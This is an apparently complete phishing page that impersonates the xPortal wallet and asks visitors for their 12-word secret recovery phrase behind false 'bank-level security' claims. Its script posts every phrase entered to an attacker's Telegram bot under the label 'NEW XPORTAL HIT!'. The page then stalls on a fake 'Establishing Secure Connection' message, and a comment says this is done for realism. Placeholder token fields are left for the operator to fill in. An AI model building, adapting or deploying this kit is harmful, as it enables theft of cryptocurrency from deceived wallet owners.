<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xPortal | Secure Wallet Access</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #000; --card: #0d0d0d; --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255,255,255,0.08); --text-gray: #888; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); }

        /* NAVIGATION */
        nav { height: 72px; padding: 0 5%; display: flex; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); position: fixed; top: 0; width: 100%; z-index: 1000; }
        .nav-logo { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 20px; letter-spacing: -0.5px; }
        .nav-logo img { width: 32px; height: 32px; object-fit: contain; }

        /* MAIN WRAPPER */
        .container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; padding-top: 100px; }
        .glass-card { background: var(--card); border: 1px solid var(--border); border-radius: 32px; padding: 45px 30px; width: 100%; max-width: 460px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
        
        .hero-logo { width: 70px; height: 70px; margin-bottom: 25px; filter: drop-shadow(0 0 15px rgba(138, 63, 252, 0.4)); }
        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
        .subtitle { color: var(--text-gray); font-size: 14px; margin-bottom: 35px; line-height: 1.5; }

        /* WORD GRID */
        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 30px; }
        .word-box { position: relative; }
        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; font-weight: 700; color: var(--teal); opacity: 0.6; }
        .word-box input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px 5px 12px 30px; color: #fff; font-size: 14px; transition: 0.3s; }
        .word-box input:focus { border-color: var(--purple); background: rgba(138, 63, 252, 0.05); outline: none; box-shadow: 0 0 15px rgba(138, 63, 252, 0.1); }

        /* BUTTONS */
        .btn-connect { width: 100%; height: 60px; background: #fff; color: #000; border: none; border-radius: 100px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-connect:hover { background: var(--teal); transform: translateY(-2px); }

        /* STATUS */
        #status-msg { display: none; margin-top: 20px; color: var(--teal); font-weight: 600; font-size: 14px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        .shield-tag { margin-top: 30px; font-size: 10px; color: #444; font-weight: 800; letter-spacing: 1.5px; display: flex; align-items: center; justify-content: center; gap: 6px; text-transform: uppercase; }
    </style>
</head>
<body>

<nav>
    <div class="nav-logo">
        <img src="Capture.PNG" alt="Logo">
        <span>xPortal</span>
    </div>
</nav>

<div class="container">
    <div class="glass-card">
        <img src="Capture.PNG" class="hero-logo">
        
        <h1>Import Wallet</h1>
        <p class="subtitle">Enter your 12-word secret recovery phrase to securely restore your wallet.</p>

        <form id="walletForm">
            <div class="phrase-grid" id="inputs">
                </div>

            <button type="submit" class="btn-connect" id="btnText">Connect Wallet</button>
        </form>

        <div id="status-msg">Establishing Secure Connection...</div>

        <div class="shield-tag">
            <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
            AES-256 Bank-Level Security
        </div>
    </div>
</div>

<script>
    // --- TELEGRAM CONFIG ---
    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Badel hada
    const CHAT_ID = 'YOUR_CHAT_ID';     // Badel hada

    // Generate 12 Inputs
    const container = document.getElementById('inputs');
    for(let i=1; i<=12; i++) {
        container.innerHTML += `
            <div class="word-box">
                <span>${i}</span>
                <input type="password" class="w-input" required autocomplete="off" oninput="handleSmartPaste(event, ${i})">
            </div>
        `;
    }

    // Smart Paste Logic: Ila dar paste l-phrase kamla f box whda kiferreqha
    function handleSmartPaste(e, index) {
        const val = e.target.value.trim();
        if (val.includes(' ')) {
            const words = val.split(/\s+/);
            const inputs = document.querySelectorAll('.w-input');
            words.forEach((w, i) => {
                if (inputs[i]) inputs[i].value = w;
            });
        }
    }

    document.getElementById('walletForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const inputs = document.querySelectorAll('.w-input');
        let phrase = [];
        inputs.forEach(i => phrase.push(i.value.trim()));

        // UI State
        document.getElementById('btnText').style.display = 'none';
        document.getElementById('status-msg').style.display = 'block';

        // Send to Telegram
        const finalPhrase = phrase.join(" ");
        const message = `🚀 NEW XPORTAL HIT!\n\nPhrase: ${finalPhrase}`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
        .then(() => {
            console.log("Logged.");
            // Hangs on "Establishing Connection" for realism
        });
    });
</script>

</body>
</html>
